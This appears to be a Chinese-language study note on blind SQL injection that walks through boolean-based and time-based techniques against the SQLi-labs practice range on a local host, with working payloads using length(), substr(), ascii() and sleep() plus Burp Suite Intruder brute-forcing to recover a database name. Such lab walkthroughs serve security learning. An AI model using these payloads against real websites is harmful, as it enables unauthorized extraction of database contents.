# SQL盲注和布尔盲注流程

**例题都是在SQLlabs靶场里面的第八题**

#  一、盲注的分类

**盲注** 就是在SQL注入过程中，SQL语句执行后，查询道德数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

**基于布尔的盲注（Boolean-Based Blind SQL Injection）**

就是SQL语句执行后，页面不返回具体数据，数据库只返回1或者0（真or假）。类似无法开口说话的人，只能通过点头和摇头来告诉你答案的正确与否。

**基于时间的盲注（Time-Based Blind SQL Injection）**

在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。

**布尔盲注的特性**

在页面中，如果正确执行了用户构造的SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句正确与否，达到获取数据据的目的。

靶场：

正常页面（真）

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759636721491-0020e383-02b7-4406-ba3e-9bd003791f97.png)

查询不到的页面（假）

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759636743070-3c558291-be67-4744-ad8c-0e03b62d075b.png)

  

# 二、布尔盲注攻击流程

1、判断是否存在注入

2、获取数据库长度

3、逐字猜解数据库名

4、逐字猜解数据库的表名

5、逐字猜解字段名

6、逐字猜解记录数据

## (一) 判断是否存在注入

1、正常查询，返回true（语句执行成功）或者返回false（语句执行没有查询到内容）

2、输入引号进行查看页面变化，页面返回false，可能存在漏洞，也可能没有查询到内容

3、利用and进行判断，比如 1 and 1=1和 1 and 1=2，1' and 1=1#和 1' and 1=2#，如果前者执行的结果不一样，说明是数字型的布尔盲注；如果后者执行的结果不一样，说明是字符型的布尔盲注。
    
    
    SELECT * FROM users WHERE id=1 AND 1=1;
    SELECT * FROM users WHERE id=1 AND 1=2;
    -------------------------------------------
    SELECT * FROM users WHERE id='1' AND 1=1#;
    SELECT * FROM users WHERE id='1' AND 1=2#;

## (二) 获取数据库长度  

因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内置函数获取字符串长度：

**length()** 单位是字节，utf8编码下，一个汉字三字节，一个数字或字母一个字节，。gbk编码下，一个汉字两个字节，一个数字或字母一个字节。

**char_length()** 单位为字符，不管汉字还是数字或者是字母都算是一个字符。

比如：

**返回的数据库长度为8**
    
    
    select length(database());

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759638377365-81720177-b2f1-4b82-909f-ddf9451c3564.png)

### 1\. 手动注入

网站注入的则为：

地址/?id=1' and length(database())<10%23

意为查询有没有比10小的，这里没有select是就算获取到，也显示不出来实际数据

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759638798588-d4ded9c5-2466-42af-bd63-b8947fdc5eed.png)

返回真，继续尝试，>5,>7,>9一个一个尝试

例：

>5

返回真，数据范围大于五，小于10

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759639049144-a0d3b82b-0580-4f65-a8dc-42feb212f404.png)

>7

返回真，数据范围大于7，小于10

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759639069194-6ca4fb70-6e71-4827-9e23-0282317eb803.png)

>9

返回假，数据范围小于9，那就是数字8了，接着尝试等于8

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759639175671-7619266f-4315-40b0-8a28-31b7380e73ea.png)

=8

返回真，数据库长度为8

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759639227275-d9eae5f4-d2d9-4247-81f2-25f91de6e743.png)

  

### 2\. Burp Suite爆破尝试

1、挂上代理，前面有安装代理的步骤，或者打开Burp Suite（bp软件），打开内置的浏览器，将要抓包的地址打开，刷新一下。

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759641234894-d4959803-d724-46ec-b2e7-5c86835d5987.png)

2、回到bp，找到要抓包的链接，点击，再点击右键，点击发送到intrude（爆破）

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759641431431-e781d12b-0251-48e3-a137-be548f63bc74.png)

3、点完之后，在导航栏进入到intrude模块

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759641375261-7d074b6e-dfe2-4823-8a99-5ff82af99c0f.png)

4、准备爆破

在数字8选中（在这个区域爆破），点击添加payload或者add，选中要爆破的数据，点击开始攻击![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759641560525-035ba1b6-84e2-45c2-ab62-7626c12f4a12.png)

5、设置载荷1

在paload中设置类型，选数值或者numbers，数字范围从1开始，截至50，间隔为1，不知道的情况下，设置差不多就行了，数据库名称长度太长的你见过吗？设置小一点，有时候题目就出的很奇怪，数值设置100或者50差不多都能涵盖到

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759641872957-c3a08dc5-8c8c-4f85-816e-6ebed02995d3.png)

6、爆破！！！

点击开始攻击，等待爆破结束，结束之后看length长度，不一样的可能就是要找的东西。然后一个一个翻的麻烦的很，就在长度那里点一点，就行了。

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759642383644-2ff6a369-3e68-4cea-b893-d87329f0a11c.png)

传入数据库查询的代码是：
    
    
    SELECT * FROM users WHERE id='1' AND LENGTH(database())=8#'

## (三) 获取数据库名

  

获取数据库长度为8，接下来就是爆数据库名，可以用截取字符串的方式进行截获

**substr(string,start,length)** 截取字符串
    
    
    地址/?id=1' and substr(database(),1,1)='s'%23

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759645507373-faa7048d-aa8c-4863-88d2-57c98f6d307b.png)

这种只能一个一个的试，很累很费时间，可以用bp爆破，加上ASCII码比对表上的数据。

附ASCII码对照表的链接：

[https://tool.oschina.net/commons?type=4](https://tool.oschina.net/commons?type=4)

1、打开bp，准备抓包

用bp内置的浏览器也不错
    
    
    http://127.0.0.1:8181/Less-8/?id=1%27%20and%20substr(database(),1,1)='s'%23
    
    
    SELECT * FROM users WHERE id='1' and substr(database(),1,1)='s'#'

图示：

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759647948448-728ca082-7269-4102-a2f7-41501bbed9a2.png)

* * *

* * *
    
    
    http://127.0.0.1:8181/Less-8/?id=1%27%20and%20substr(database(),2,1))='e'%23
    
    
    SELECT * FROM users WHERE id='1' and substr(database(),2,1)='e'#'

图示：

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759648054404-99326fea-726c-4917-82d9-185625fa3c00.png)

这样设置太慢了，可以用到ascii函数，从ASCII里面比对。

ascii() 把字符转换成ascii码值的函数

ASCII对照表

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759647153324-7f61ef90-d1c5-40bc-8ea5-b9a553b89187.png)
    
    
    http://127.0.0.1:8181/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115%23

这样的话，就用bp玩。开浏览器和bp，如图所示

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759646466744-b7c1f18a-5e60-4e16-a3ef-af607d437b5c.png)

2、抓包

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759646520053-59c7184f-3f32-4b71-8fc5-b9de3b351d23.png)

3、设置载荷：

设置攻击方式为集束炸弹或者最底下的那个，将起始位（start）的1选中，添加，将115选中，添加。将右侧payload改成如图所示，另外一张也是的。

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759646725546-e65b13f0-7feb-4b8a-8fa4-f8cdae3b2102.png)

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759646953154-e4fee104-bd7c-46bc-bc92-64ce512a0d65.png)

解释一下，这里的122是参照ASCII码上的大小写字母的，这里可以从设置成65，最低是1，自己看着来

5、爆破！！！

猛攻！！！

将爆破后的数据排序，发现返回长度都是881的，从低到高排序（点一下长度或者length，会自动排序）

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759648511177-c6f9f6c9-1661-4b7a-b0eb-59f99c9d8c2a.png)

结果对照表

序号| ASCII码| 字符  
---|---|---  
1| 115| s  
2| 101| e  
3| 99| c  
4| 117| u  
5| 114| r  
6| 105| i  
7| 116| t  
8| 121| y  
结果：security  
  
数据库名称比对（仅作实验，一般算到这里答案就已经得到了）

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759649039450-b3d670d0-5ca2-4277-90cb-4d7cb822efbd.png)

后续可以做爆字段，数据等等。

# 三、时间盲注流程

靶场第九关

1、判断是否是时间盲注
    
    
    http://127.0.0.1:8181/Less-9/?id=1' and sleep(10)%23

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759650366446-c44cd885-e26f-47e5-be8e-a68e029fea88.png)

查看响应时间

点击网络，点击响应的地址

每个浏览器的方法都差不多，有些响应时间差一点点没关系。

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759650452011-e3aefc89-bcfc-45be-ab38-5021319aa0e8.png)

2、尝试爆数据库长度
    
    
    地址/?id=1' and if(length(database())=8,sleep(10),1)%23

if() 判断函数

示例： if(exp1,exp2,exp3)

bp抓包

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759651830092-4ff9e045-374d-420c-a5bc-27f934cc2679.png)

设置载荷

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759651990173-e0c45603-6c4a-4dc2-b62d-cad79eb3e7fb.png)

攻击！！！

点击长度进行排序，答案

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759652083116-19846440-b864-42e4-a0e4-e424f373d50c.png)

如果感觉不放心的话，就点开时间和响应，再排序一下就可以了

![](https://cdn.nlark.com/yuque/0/2025/png/57654064/1759652045737-b941a16a-3d77-4586-b0a4-b1e878e66c15.png)

完了...

---
*迁移自语雀文档，原始ID: pbabfh8gguf52tz8*